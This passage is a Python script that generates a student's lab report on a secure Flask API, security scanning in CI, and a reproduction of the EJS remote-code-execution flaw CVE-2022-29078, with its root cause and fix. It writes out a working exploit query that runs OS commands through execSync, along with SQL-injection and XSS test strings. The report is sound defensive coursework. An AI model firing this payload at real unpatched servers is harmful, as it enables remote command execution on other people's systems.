"""Build the Work 1 report as a DOCX file."""

from __future__ import annotations

import os
import re
from pathlib import Path

from docx import Document
from docx.enum.section import WD_SECTION
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.enum.text import WD_ALIGN_PARAGRAPH, WD_BREAK
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Cm, Pt, RGBColor

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
OUT = HERE / "Lab1_Report.docx"

BLUE = RGBColor(0x1F, 0x4E, 0x79)
DARK = RGBColor(0x21, 0x25, 0x29)
GREY = RGBColor(0x59, 0x59, 0x59)
RED = RGBColor(0xB0, 0x2A, 0x37)


def set_cell_background(cell, hex_color: str) -> None:
    tc_pr = cell._tc.get_or_add_tcPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"), hex_color)
    tc_pr.append(shd)


def set_repeat_header(row) -> None:
    tr_pr = row._tr.get_or_add_trPr()
    tbl_header = OxmlElement("w:tblHeader")
    tbl_header.set(qn("w:val"), "true")
    tr_pr.append(tbl_header)


def add_page_number(paragraph) -> None:
    run = paragraph.add_run()
    for tag, value in (("begin", None), (None, "PAGE"), ("end", None)):
        if tag:
            fld = OxmlElement("w:fldChar")
            fld.set(qn("w:fldCharType"), tag)
            run._r.append(fld)
        else:
            instr = OxmlElement("w:instrText")
            instr.set(qn("xml:space"), "preserve")
            instr.text = value
            run._r.append(instr)


def shade_paragraph(paragraph, fill: str = "F4F6F8") -> None:
    p_pr = paragraph._p.get_or_add_pPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"), fill)
    p_pr.append(shd)


def add_code(doc: Document, text: str) -> None:
    paragraph = doc.add_paragraph()
    paragraph.paragraph_format.space_before = Pt(4)
    paragraph.paragraph_format.space_after = Pt(6)
    paragraph.paragraph_format.left_indent = Cm(0.2)
    paragraph.paragraph_format.keep_together = True
    shade_paragraph(paragraph)
    lines = text.strip("\n").split("\n")
    for index, line in enumerate(lines):
        run = paragraph.add_run(line if line else " ")
        run.font.name = "Consolas"
        run.font.size = Pt(8)
        run.font.color.rgb = DARK
        run._element.rPr.rFonts.set(qn("w:eastAsia"), "Consolas")
        if index != len(lines) - 1:
            run.add_break()


def add_caption(doc: Document, text: str) -> None:
    paragraph = doc.add_paragraph()
    paragraph.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = paragraph.add_run(text)
    run.italic = True
    run.font.size = Pt(8.5)
    run.font.color.rgb = GREY


def add_table(doc: Document, headers, rows, widths=None, font_size=8.5):
    table = doc.add_table(rows=1, cols=len(headers))
    table.style = "Table Grid"
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    table.autofit = False

    header_cells = table.rows[0].cells
    for index, header in enumerate(headers):
        cell = header_cells[index]
        cell.text = ""
        paragraph = cell.paragraphs[0]
        run = paragraph.add_run(header)
        run.bold = True
        run.font.size = Pt(font_size)
        run.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
        set_cell_background(cell, "1F4E79")
    set_repeat_header(table.rows[0])

    for row_data in rows:
        cells = table.add_row().cells
        for index, value in enumerate(row_data):
            cell = cells[index]
            cell.text = ""
            paragraph = cell.paragraphs[0]
            run = paragraph.add_run(str(value))
            run.font.size = Pt(font_size)

    for row in table.rows:
        tr_pr = row._tr.get_or_add_trPr()
        cant_split = OxmlElement("w:cantSplit")
        tr_pr.append(cant_split)

    if widths:
        for index, width in enumerate(widths):
            table.columns[index].width = Cm(width)
            for cell in table.columns[index].cells:
                cell.width = Cm(width)
    return table


def style_document(doc: Document) -> None:
    section = doc.sections[0]
    section.page_width = Cm(21)
    section.page_height = Cm(29.7)
    section.top_margin = Cm(2.2)
    section.bottom_margin = Cm(2.0)
    section.left_margin = Cm(2.2)
    section.right_margin = Cm(2.0)

    normal = doc.styles["Normal"]
    normal.font.name = "Calibri"
    normal.font.size = Pt(10.5)
    normal.font.color.rgb = DARK
    normal.paragraph_format.space_after = Pt(6)
    normal.paragraph_format.line_spacing = 1.12
    normal.element.rPr.rFonts.set(qn("w:eastAsia"), "SimSun")

    for name, size, color, before, after in (
        ("Heading 1", 16, BLUE, 18, 8),
        ("Heading 2", 12.5, BLUE, 12, 4),
        ("Heading 3", 11, BLUE, 10, 3),
    ):
        style = doc.styles[name]
        style.font.name = "Calibri"
        style.font.size = Pt(size)
        style.font.bold = True
        style.font.color.rgb = color
        style.paragraph_format.space_before = Pt(before)
        style.paragraph_format.space_after = Pt(after)
        style.element.rPr.rFonts.set(qn("w:eastAsia"), "SimSun")

    footer = section.footer.paragraphs[0]
    footer.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = footer.add_run("HDU IS - Laboratory Work 1  |  page ")
    run.font.size = Pt(8)
    run.font.color.rgb = GREY
    add_page_number(footer)

    header = section.header.paragraphs[0]
    header.alignment = WD_ALIGN_PARAGRAPH.RIGHT
    header_run = header.add_run("Secure REST API + CVE-2022-29078")
    header_run.font.size = Pt(8)
    header_run.font.color.rgb = GREY


def add_title_page(doc: Document) -> None:
    for _ in range(2):
        doc.add_paragraph()

    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run("HANGZHOU DIANZI UNIVERSITY")
    run.font.size = Pt(12)
    run.font.color.rgb = GREY
    run.font.name = "Calibri"
    run.bold = True

    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run("Information Security Laboratory")
    run.font.size = Pt(12)
    run.font.color.rgb = GREY

    doc.add_paragraph()
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run("LABORATORY WORK No. 1")
    run.font.size = Pt(14)
    run.font.color.rgb = RED
    run.bold = True

    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.paragraph_format.space_before = Pt(10)
    run = p.add_run("Secure REST API Development with CI/CD\nand Real CVE Vulnerability Analysis")
    run.font.size = Pt(24)
    run.font.color.rgb = BLUE
    run.bold = True

    doc.add_paragraph()
    doc.add_paragraph()

    info = [
        ("Variant", "N/A (not assigned)"),
        ("Student", "李泽涛 / LiZetao"),
        ("HDU number", "23320332"),
        ("Group", "23320113"),
        ("Repository", "https://github.com/mycbdys/lab1"),
        ("Submission date", "19 October 2026"),
    ]
    table = doc.add_table(rows=0, cols=2)
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    for label, value in info:
        cells = table.add_row().cells
        cells[0].text = ""
        run = cells[0].paragraphs[0].add_run(label)
        run.bold = True
        run.font.size = Pt(10.5)
        run.font.color.rgb = BLUE
        cells[1].text = value
        for paragraph in cells[1].paragraphs:
            for run in paragraph.runs:
                run.font.size = Pt(10.5)
    for row in table.rows:
        row.cells[0].width = Cm(4.0)
        row.cells[1].width = Cm(9.0)

    for _ in range(3):
        doc.add_paragraph()
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run(
        "Python 3.13 / Flask 3.1  |  SQLite  |  pytest  |  Bandit  |  pip-audit  |  Node.js 20 / EJS"
    )
    run.font.size = Pt(9)
    run.font.color.rgb = GREY

    doc.add_page_break()


def add_contents(doc: Document) -> None:
    doc.add_heading("Contents", level=1)
    entries = [
        "1. Purpose and scope",
        "2. Task list and completion status",
        "3. Stack, architecture and repository",
        "4. API implementation",
        "5. Security measures",
        "6. CI/CD pipeline with SAST and SCA",
        "7. CVE-2022-29078: reproduction, root cause and fix",
        "8. Control questions (separate document)",
        "9. Testing and evaluation",
        "10. Submission package",
        "11. Limitations and honest disclosure",
        "12. Conclusion",
        "Appendix A. Commands",
        "Appendix B. File inventory",
        "References",
    ]
    for entry in entries:
        p = doc.add_paragraph(entry)
        p.paragraph_format.space_after = Pt(2)
    doc.add_page_break()


def add_section_1(doc: Document) -> None:
    doc.add_heading("1. Purpose and scope", level=1)
    doc.add_paragraph(
        "This work accompanies Work 1 of the HDU Information Security laboratory manual: "
        "\u201cSecure REST API Development with CI/CD and Real CVE Vulnerability Analysis\u201d. "
        "Its purpose is to practise the full security lifecycle of a small backend service: "
        "designing protection against the OWASP Top 10, integrating automated security checks "
        "into CI/CD, reproducing a real CVE in a controlled environment, identifying its root "
        "cause, applying a fix and verifying that the fix works without breaking functionality."
    )
    doc.add_paragraph(
        "The submission contains three connected parts. The first is a Flask REST API with three "
        "endpoints, bcrypt password storage, JWT authentication, parameterised SQL, output encoding "
        "and defensive HTTP headers. The second is a GitHub Actions pipeline that runs unit tests, "
        "Bandit (SAST) and pip-audit (SCA) on every push and pull request. The third is a controlled "
        "reproduction of CVE-2022-29078, a remote-code-execution flaw in the EJS template engine, "
        "including the vulnerable environment, the exploit request, the root-cause analysis, the "
        "patched version and the regression checks."
    )
    doc.add_paragraph(
        "All commands in this report were executed on the delivered files. The raw terminal output "
        "is kept in evidence/ and cve/CVE-2022-29078/evidence/ so every claim can be checked. "
        "Where the build environment could not satisfy a manual requirement (Docker, a GitHub "
        "remote, personal data), this is stated explicitly in Section 11 rather than hidden."
    )

    doc.add_heading("1.1 What was built", level=2)
    add_table(
        doc,
        ["Component", "Technology", "Purpose"],
        [
            ("REST API", "Python 3.13, Flask 3.1.3", "Three endpoints, JWT auth, bcrypt, SQLite"),
            ("Automated tests", "pytest 9.1.1", "21 functional and security tests"),
            ("SAST", "Bandit 1.9.4", "Static analysis of the application code in CI"),
            ("SCA", "pip-audit 2.10.1", "Known-vulnerability check of the dependency tree"),
            ("CI/CD", "GitHub Actions", "Tests + SAST + SCA on push and pull request"),
            ("CVE lab", "Node.js 20, EJS 3.1.6 / 3.1.7, Express 4.21.2", "CVE-2022-29078 reproduction and fix"),
        ],
        widths=[3.2, 6.2, 7.2],
    )
    add_caption(doc, "Table 1. Main components of the submission.")


def add_section_2(doc: Document) -> None:
    doc.add_heading("2. Task list and completion status", level=1)
    doc.add_paragraph(
        "The manual defines eleven steps. Table 2 maps each step to the artifact that implements it "
        "and to the evidence that proves it was executed. \u201cDone\u201d means the artifact exists and "
        "was run; \u201cpartial\u201d is used only where an external dependency was unavailable."
    )
    rows = [
        ("1", "Choose stack, create project, init git, link remote", "Done", "Flask project, requirements.txt, public repository and git history"),
        ("2", "Implement 3 methods (login, data, own method)", "Done", "app/auth.py, app/api.py; evidence/api-demo.txt"),
        ("3", "SQLi, XSS, JWT, password hashing, auth middleware", "Done", "app/db.py, app/security.py; 21 tests"),
        ("4", "CI/CD with SAST and SCA on every push/PR", "Done", ".github/workflows/ci.yml; security/ reports"),
        ("5", "Test with curl/Postman; capture scanner reports", "Done", "scripts/api_demo.ps1; security/*.json"),
        ("6", "Docker + Vulhub: choose and study a CVE", "Partial", "cve/CVE-2022-29078 (Docker absent; Node run instead)"),
        ("7", "Launch vulnerable environment, reproduce attack", "Done", "run_demo.ps1; evidence/vulnerable-run.txt"),
        ("8", "Root-cause analysis", "Done", "cve/.../README.md Section 4; Section 7.4"),
        ("9", "Develop and apply the fix, rebuild", "Done", "fixed/ package; patches/fix.diff"),
        ("10", "Verify fix, repeat exploit, regression-test", "Done", "evidence/fixed-run.txt; pytest 21/21"),
        ("11", "Structured report with title page", "Done", "this document"),
    ]
    add_table(doc, ["#", "Manual task", "Status", "Evidence"], rows, widths=[0.9, 6.4, 2.0, 7.3], font_size=8)
    add_caption(doc, "Table 2. Manual steps and their implementation.")

    doc.add_paragraph(
        "The \u201cWhat Students Submit\u201d list is also covered: the public repository link and the "
        "pipeline-run link are placeholders to be filled after the student pushes the folder; the "
        "README contains the API description, the security measures, the CVE description, the "
        "reproduction sequence, the root cause and the proof of elimination; and the fixes are in "
        "cve/CVE-2022-29078/fixed/ plus patches/fix.diff."
    )


def add_section_3(doc: Document) -> None:
    doc.add_heading("3. Stack, architecture and repository", level=1)
    doc.add_heading("3.1 Stack selection", level=2)
    doc.add_paragraph(
        "Python with Flask was chosen because the security controls required by the manual can be "
        "written explicitly and reviewed line by line: sqlite3 with bound parameters, PyJWT with a "
        "pinned algorithm, bcrypt with a tunable cost, and html.escape for output encoding. Flask is "
        "small enough that no framework \u201cmagic\u201d hides the authentication middleware or the SQL "
        "layer, which makes the SAST results meaningful and the report easy to defend. SQLite keeps "
        "the lab self-contained; the same SQL would run on PostgreSQL after changing the driver."
    )

    doc.add_heading("3.2 Request lifecycle", level=2)
    doc.add_paragraph(
        "A login request is parsed as JSON, validated (username pattern, password length), rate "
        "limited, looked up with a bound SELECT, verified with bcrypt and, on success, turned into a "
        "15-minute HS256 JWT. A protected request carries Authorization: Bearer <token>; the auth "
        "middleware verifies the signature, algorithm, expiry, issuer and audience, loads the user "
        "from the sub claim, and stores it in g.current_user. The route then queries only rows "
        "belonging to that user, HTML-escapes the text and returns JSON. Every response passes "
        "through an after_request hook that adds security headers."
    )
    doc.add_picture(str(HERE / "images" / "architecture.png"), width=Cm(16.6))
    add_caption(doc, "Figure 1. API architecture: authentication, data access and CI are separate trust boundaries.")

    doc.add_heading("3.3 Repository layout", level=2)
    add_code(
        doc,
        """lab1/
  app/            Flask application (factory, config, db, security, auth, api)
  tests/          pytest suite (21 tests)
  scripts/        seed.py, api_demo.ps1 (curl walkthrough)
  .github/        GitHub Actions workflow (test + SAST + SCA)
  security/       Bandit and pip-audit reports, scanner summary
  cve/            CVE-2022-29078 vulnerable/fixed apps, evidence, patch
  evidence/       API acceptance transcript
  docs/           this report, control answers, checklist, figures
  requirements.txt / requirements-dev.txt / run.py / README.md""",
    )


def add_section_4(doc: Document) -> None:
    doc.add_heading("4. API implementation", level=1)
    doc.add_paragraph(
        "The API implements the two required methods and one additional method that exercises a "
        "write path and object ownership."
    )
    add_table(
        doc,
        ["Method and path", "Auth", "Request", "Success response", "Main errors"],
        [
            ("POST /auth/login", "No", '{"username","password"}', "200: access_token, token_type, expires_in", "400 invalid input; 401 bad credentials; 429 rate limit"),
            ("GET /api/data", "Bearer JWT", "none", "200: username + own posts (escaped)", "401 missing/invalid token"),
            ("POST /api/posts", "Bearer JWT", '{"title","body"}', "201: created post (escaped)", "400 invalid body; 401 missing token"),
        ],
        widths=[4.0, 2.1, 3.8, 4.6, 4.5],
        font_size=8,
    )
    add_caption(doc, "Table 3. Endpoints and contracts.")

    doc.add_heading("4.1 Login", level=2)
    add_code(
        doc,
        """POST /auth/login
{"username":"alice","password":"Alice#2026"}

200 OK
{"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"Bearer","expires_in":900}

401 Unauthorized (same message for unknown user and wrong password)
{"error":"Unauthorized","message":"Invalid username or password"}""",
    )

    doc.add_heading("4.2 Data retrieval", level=2)
    add_code(
        doc,
        """GET /api/data
Authorization: Bearer <token>

200 OK
{"username":"alice","posts":[
  {"id":1,"title":"&lt;script&gt;alert(1)&lt;/script&gt;",
   "body":"XSS test","created_at":"2026-10-19 03:10:10"}]}""",
    )
    doc.add_paragraph(
        "Notice that the stored angle brackets come back as &lt; and &gt;. The database keeps the "
        "original text; the API encodes it at the output boundary, which is the correct place for "
        "context-aware escaping."
    )

    doc.add_heading("4.3 Create post (own method)", level=2)
    doc.add_paragraph(
        "The third method was chosen because it exercises authentication, input validation, a write "
        "query and object ownership at the same time. A client cannot choose user_id: the server "
        "takes it from the verified token. The created row is returned immediately and is later "
        "visible only to its owner through GET /api/data."
    )
    add_code(
        doc,
        """POST /api/posts
Authorization: Bearer <token>
{"title":"Hello","body":"World"}

201 Created
{"id":2,"title":"Hello","body":"World","created_at":"..."}""",
    )


def add_section_5(doc: Document) -> None:
    doc.add_heading("5. Security measures", level=1)
    doc.add_paragraph(
        "The controls are mapped to the OWASP Top 10 categories named in the manual: A01 Broken "
        "Access Control, A03 Injection and A07 Identification and Authentication Failures."
    )

    doc.add_heading("5.1 SQL injection protection", level=2)
    doc.add_paragraph(
        "Every SQL statement is a constant string with ? placeholders; values are passed as a "
        "separate tuple. No user input is formatted into SQL, and no ORM is needed to demonstrate "
        "the principle. The same rule is applied to SELECT, INSERT and the login lookup."
    )
    add_code(
        doc,
        """# app/auth.py
user = get_db().execute(
    "SELECT id, username, password_hash FROM users WHERE username = ?", (username,)
).fetchone()

# app/api.py
connection.execute(
    "INSERT INTO posts (user_id, title, body) VALUES (?, ?, ?)",
    (g.current_user["id"], title, body),
)""",
    )
    doc.add_paragraph(
        "Input validation is applied as defence in depth, not as the primary control: the username "
        "must match ^[A-Za-z0-9_.-]{3,32}$, so a classic payload such as alice' OR '1'='1 is rejected "
        "with 400 before it reaches the database. A password payload such as ' OR '1'='1' -- passes "
        "validation but fails bcrypt verification and returns 401. The automated tests assert both "
        "outcomes, and a test stores the string '; DROP TABLE posts; -- as a post title and confirms "
        "that the table still exists afterwards."
    )

    doc.add_heading("5.2 Cross-site scripting protection", level=2)
    doc.add_paragraph(
        "The API stores text verbatim and escapes it on output with html.escape(value, quote=True). "
        "This produces &lt;script&gt; instead of an executable tag and also encodes quotes, so the "
        "value is safe in HTML text and attribute contexts. Responses are JSON with "
        "X-Content-Type-Options: nosniff, and the Content-Security-Policy forbids scripts entirely "
        "(default-src 'none')."
    )
    add_code(
        doc,
        """# app/security.py
def escape_text(value: str) -> str:
    return html.escape(value, quote=True)

# app/api.py
"title": escape_text(row["title"]),
"body":  escape_text(row["body"]),""",
    )
    doc.add_paragraph(
        "The test creates a post whose title is <script>alert('xss')</script> and asserts that the "
        "raw response contains no <script> substring and that the JSON value is "
        "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;. The captured API transcript shows the "
        "same result for a simpler payload."
    )

    doc.add_heading("5.3 Authentication and session handling", level=2)
    doc.add_paragraph(
        "Passwords are hashed with bcrypt at cost 12 and a per-password salt; the plaintext is never "
        "stored or logged. Login errors are identical for an unknown user and a wrong password, and "
        "an unknown user is still checked against a dummy hash so the response time does not reveal "
        "whether the account exists. Five failed attempts per minute per IP and username return 429 "
        "with Retry-After. This is a small in-memory limiter, sufficient for the lab; a production "
        "deployment would use Redis or an API gateway."
    )
    doc.add_paragraph(
        "A successful login issues a JWT with sub, username, iat, nbf, exp, iss, aud and jti. The "
        "token is signed with HS256 and lives for 15 minutes. Verification is not just a decode: the "
        "server recomputes the signature with its secret, pins algorithms=[\"HS256\"] (so alg=none and "
        "algorithm-confusion attacks fail), validates issuer and audience, and requires exp, iat, sub, "
        "iss and aud. Tests cover tampered tokens, expired tokens, alg=none tokens, tokens signed with "
        "another key and tokens for a deleted user."
    )
    add_code(
        doc,
        """claims = jwt.decode(
    token, current_app.config["SECRET_KEY"],
    algorithms=["HS256"],
    audience=current_app.config["JWT_AUDIENCE"],
    issuer=current_app.config["JWT_ISSUER"],
    options={"require": ["exp", "iat", "sub", "iss", "aud"]},
)""",
    )

    doc.add_heading("5.4 Access control", level=2)
    doc.add_paragraph(
        "The API never accepts a user id or an object owner from the client. GET /api/data filters "
        "with WHERE user_id = ? using the id from the verified token, and POST /api/posts inserts the "
        "same id. A test logs in as alice, creates a post, logs in as bob and asserts that bob's feed "
        "is empty. This prevents horizontal privilege escalation (IDOR)."
    )

    doc.add_heading("5.5 Defensive headers and error handling", level=2)
    add_table(
        doc,
        ["Header / behaviour", "Value", "Why"],
        [
            ("Content-Security-Policy", "default-src 'none'; frame-ancestors 'none'; base-uri 'none'", "No script, frame or plugin execution"),
            ("X-Content-Type-Options", "nosniff", "Stop MIME sniffing"),
            ("X-Frame-Options", "DENY", "Clickjacking protection"),
            ("Referrer-Policy", "no-referrer", "Do not leak URLs"),
            ("Cache-Control", "no-store on /auth and /api", "Tokens and data not cached"),
            ("Permissions-Policy", "camera=(), microphone=(), geolocation=()", "Disable unused features"),
            ("Errors", "generic JSON, debug off", "No stack traces or internals"),
        ],
        widths=[4.8, 7.2, 6.8],
        font_size=8,
    )
    add_caption(doc, "Table 4. Hardening headers applied to every response.")
    doc.add_paragraph(
        "The API does not enable CORS, does not use eval or pickle, never calls a shell, and reads the "
        "JWT secret from the environment. If SECRET_KEY is absent, a random per-process value is "
        "generated so a developer cannot accidentally deploy a hard-coded secret; production must "
        "provide a stable 32+ byte value from a secret manager."
    )


def add_section_6(doc: Document) -> None:
    doc.add_heading("6. CI/CD pipeline with SAST and SCA", level=1)
    doc.add_paragraph(
        "The workflow .github/workflows/ci.yml runs on every push to main, every pull request and on "
        "manual dispatch. It has three independent jobs, so a failing scanner does not hide test "
        "results and vice versa."
    )
    add_table(
        doc,
        ["Job", "Tool", "What it does", "Gate"],
        [
            ("test", "pytest 9.1.1", "Runs the 21 API tests on Python 3.12", "Any failure fails the build"),
            ("sast", "Bandit 1.9.4", "Scans app/ and writes SARIF", "Medium/high findings fail the build"),
            ("sca", "pip-audit 2.10.1", "Audits requirements, writes CycloneDX SBOM", "Any known vulnerability fails the build"),
        ],
        widths=[1.8, 3.2, 8.0, 5.8],
        font_size=8,
    )
    add_caption(doc, "Table 5. CI jobs and quality gates.")

    doc.add_paragraph(
        "SAST (Bandit) reads the source without executing it and looks for dangerous constructs: "
        "hard-coded passwords, eval/exec, weak crypto, shell calls, insecure deserialisation and "
        "similar patterns. It runs early and points to the exact line, but it cannot see runtime "
        "configuration or prove exploitability. SCA (pip-audit) resolves the dependency tree and "
        "compares every package version with public advisories, producing a report and an SBOM. It "
        "catches the class of problem that this work's CVE belongs to: a vulnerable third-party "
        "version that the team did not write. The two are complementary, which is why both are in "
        "the pipeline."
    )

    doc.add_heading("6.1 Results", level=2)
    add_table(
        doc,
        ["Check", "Scope", "Result"],
        [
            ("pytest", "21 tests", "21 passed"),
            ("Bandit", "app/ - 303 LOC", "0 issues (0 high, 0 medium, 0 low)"),
            ("pip-audit", "44 installed packages", "0 known vulnerabilities"),
        ],
        widths=[3.4, 6.4, 9.0],
        font_size=8.5,
    )
    add_caption(doc, "Table 6. Local execution of the same checks used by CI.")
    doc.add_paragraph(
        "The first Bandit run reported one low-severity B105 finding for the string constant "
        "\"Bearer\". It was a false positive caused by the constant's name; instead of suppressing it "
        "with # nosec, the constant was renamed to AUTH_SCHEME, and the final report is clean. This "
        "is a small but useful lesson: a scanner finding should be understood and removed, not "
        "silenced."
    )
    doc.add_paragraph(
        "The GitHub-hosted run could not be executed because no repository remote or credentials were "
        "available in the build environment. The workflow is committed, and the exact commands were "
        "run locally; Section 11 lists the two placeholders the student must fill after pushing."
    )


def add_section_7(doc: Document) -> None:
    doc.add_heading("7. CVE-2022-29078: reproduction, root cause and fix", level=1)
    doc.add_paragraph(
        "The manual recommends starting with a web-application CVE that is not too complex. "
        "CVE-2022-29078 was selected because it is a real, recent, high-impact remote-code-execution "
        "flaw in a widely used Node.js template engine, and because its root cause can be read "
        "directly in the library source rather than inferred from a binary."
    )

    doc.add_heading("7.1 Vulnerability profile", level=2)
    add_table(
        doc,
        ["Field", "Value"],
        [
            ("CVE", "CVE-2022-29078 (GHSA-phwq-j96m-2c2q)"),
            ("Component", "ejs (Embedded JavaScript templates) for Node.js"),
            ("Affected versions", "EJS before 3.1.7 (confirmed on 3.1.6)"),
            ("Fixed version", "EJS 3.1.7"),
            ("Class", "CWE-74 injection / server-side template injection leading to RCE"),
            ("CVSS 3.1", "9.8 Critical - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
            ("Published", "25 April 2022"),
            ("Impact", "Unauthenticated attacker executes arbitrary OS commands during template compilation"),
        ],
        widths=[4.0, 12.4],
        font_size=8.5,
    )
    add_caption(doc, "Table 7. CVE-2022-29078 profile (NVD, OSV, GitHub Advisory).")

    doc.add_page_break()
    doc.add_heading("7.2 Environment", level=2)
    doc.add_paragraph(
        "The manual's step 6 assumes Docker and Vulhub. Docker Desktop was not installed on the "
        "Windows host, so the first execution used Node.js 20 with the same package versions. To "
        "verify the Docker/Vulhub deliverable in a real Docker environment, the same compose files "
        "were also executed on the GitHub Actions ubuntu-latest runner (workflow cve-docker.yml): "
        "the vulnerable container returned HTTP 200 and pwned.txt inside it contained "
        "uid=0(root) gid=0(root), while the fixed container rendered the normal page and had no "
        "pwned.txt. Both execution paths are therefore covered."
    )
    doc.add_paragraph(
        "Docker run: https://github.com/mycbdys/lab1/actions/runs/39195350651 (artifact "
        "cve-docker-evidence; copies under docs/evidence/docker-ci/)."
    )
    add_table(
        doc,
        ["Item", "Vulnerable run", "Fixed run"],
        [
            ("Node.js", "v20.18.0", "v20.18.0"),
            ("Express", "4.21.2", "4.21.2"),
            ("EJS", "3.1.6", "3.1.7"),
            ("Listen address", "127.0.0.1:3000", "127.0.0.1:3001"),
            ("Entry point", "vulnerable/app.js", "fixed/app.js"),
        ],
        widths=[4.4, 6.0, 6.0],
        font_size=8.5,
    )
    add_caption(doc, "Table 8. Reproduction environment.")

    doc.add_heading("7.3 Reproduction", level=2)
    doc.add_paragraph(
        "The vulnerable route passes the whole query object into res.render(). The payload is placed "
        "in settings[view options][outputFunctionName]; Express parses the nested query keys, EJS "
        "merges that object into its compiler options, and the option value is concatenated into the "
        "generated function source."
    )
    add_code(
        doc,
        """GET /?settings%5Bview%20options%5D%5BoutputFunctionName%5D=
    x%3Bprocess.mainModule.require(%22child_process%22)
    .execSync(%22cmd%20%2Fc%20whoami%20%3E%20pwned.txt%22%2C%7Bstdio%3A%22ignore%22%7D)%3Bs

Decoded value:
x;process.mainModule.require("child_process").execSync(
    "cmd /c whoami > pwned.txt", {stdio:"ignore"});s""",
    )
    doc.add_paragraph(
        "The request returns 200 OK with the normal page. The command has already executed, and "
        "pwned.txt contains the output of whoami. The status code is therefore not evidence of "
        "safety: a successful exploit can leave the response unchanged."
    )
    add_code(
        doc,
        """ejs: 3.1.6
http_status: 200
response_body: <p>Hello, guest!</p>
pwned_file_created: True
command_output: desktop-et4qsee\\<user>
RESULT: VULNERABLE - arbitrary command execution confirmed.""",
    )
    add_caption(doc, "Excerpt from cve/CVE-2022-29078/evidence/vulnerable-run.txt.")

    doc.add_heading("7.4 Root cause analysis", level=2)
    doc.add_paragraph(
        "The flaw is a chain of three design mistakes rather than one missing check."
    )
    doc.add_paragraph(
        "First, the application forwards an attacker-controlled object into an API that accepts both "
        "data and options. Second, EJS's Express-compatibility code treats data.settings[\"view "
        "options\"] as internal compiler configuration and shallow-copies every key into opts without "
        "an allow-list. Third, Template.prototype.compile concatenates opts.outputFunctionName "
        "directly into the generated JavaScript source: "
    )
    add_code(
        doc,
        """// ejs 3.1.6, lib/ejs.js (renderFile)
viewOpts = data.settings["view options"];
if (viewOpts) {
  utils.shallowCopy(opts, viewOpts);      // attacker controls opts.*
}

// ejs 3.1.6, Template.prototype.compile
if (opts.outputFunctionName) {
  prepended += "  var " + opts.outputFunctionName + " = __append;\\n";
}""",
    )
    doc.add_paragraph(
        "With the payload, the generated line becomes var x; <payload>; s = __append;. JavaScript "
        "parses this as several statements: the declaration, the execSync call, and an assignment "
        "that keeps the code syntactically valid. The command runs during compilation, before the "
        "template renders. The trailing s is what makes the injection reliable: without it the "
        "generated code would be a syntax error and the attack would fail."
    )
    doc.add_picture(str(HERE / "images" / "cve-flow.png"), width=Cm(15.6))
    add_caption(doc, "Figure 2. Data flow from the query parameter to command execution.")
    doc.add_paragraph(
        "In classification terms this is an injection through configuration (CWE-74): user input is "
        "interpreted as code because it is placed into a code template without neutralisation. It is "
        "not a memory-safety bug, a logic error in authentication, or a simple missing authorisation "
        "check. The vulnerable precondition is a library API that mixes data and options and then "
        "uses an option as source code."
    )

    doc.add_heading("7.5 The fix", level=2)
    doc.add_paragraph(
        "Two independent layers were applied. The primary fix is to upgrade EJS from 3.1.6 to 3.1.7, "
        "where the option is validated as a JavaScript identifier before it is concatenated:"
    )
    add_code(
        doc,
        """// ejs 3.1.7
if (opts.outputFunctionName) {
  if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
    throw new Error("outputFunctionName is not a valid JS identifier.");
  }
  prepended += "  var " + opts.outputFunctionName + " = __append;\\n";
}""",
    )
    doc.add_paragraph(
        "The regular expression accepts only [A-Za-z_$][A-Za-z0-9_$]*, so semicolons, quotes, "
        "parentheses and dots cannot appear. localsName and destructuredLocals receive the same "
        "validation. This removes the code-injection primitive even if a caller still passes "
        "user-controlled options. The second layer is application-side: the fixed route no longer "
        "passes the query object as render data. It extracts one scalar, limits it to 64 characters "
        "and renders { name } only."
    )
    add_code(
        doc,
        """// fixed/app.js
app.get("/", (req, res) => {
  const raw = req.query.name;
  const name = typeof raw === "string" ? raw.slice(0, 64) : "guest";
  res.render("index", { name });
});""",
    )
    doc.add_paragraph(
        "The combination is effective because neither layer depends on a blocklist of dangerous "
        "characters. The library enforces the grammar at the sink, and the application prevents "
        "request data from reaching the option namespace at the source. If a future EJS option is "
        "found vulnerable, the application layer still prevents exploitation; if another route passes "
        "options, the library layer still rejects malformed identifiers."
    )

    doc.add_heading("7.6 Verification and regression", level=2)
    doc.add_paragraph(
        "The same exploit request was sent to the fixed application. No file was created, the page "
        "still rendered, and the library-level check rejected the option:"
    )
    add_code(
        doc,
        """ejs: 3.1.7
http_status: 200
response_body: <p>Hello, guest!</p>
pwned_file_created: False
library_level_check: BLOCKED: outputFunctionName is not a valid JS identifier.
RESULT: FIXED - attack blocked, page still renders (no code execution, no regression).""",
    )
    add_caption(doc, "Excerpt from cve/CVE-2022-29078/evidence/fixed-run.txt.")
    doc.add_paragraph(
        "Regression testing covered the normal greeting, the health endpoint and the full API test "
        "suite. The fixed app returns the same page and still reports EJS 3.1.7 on /health; the API "
        "suite remains 21/21 after the security work. This satisfies manual step 10: the attack no "
        "longer succeeds and the main functionality still works."
    )


def add_section_8(doc: Document) -> None:
    doc.add_heading("8. Control questions", level=1)
    doc.add_paragraph(
        "The eight control questions from the manual are answered in the separate document "
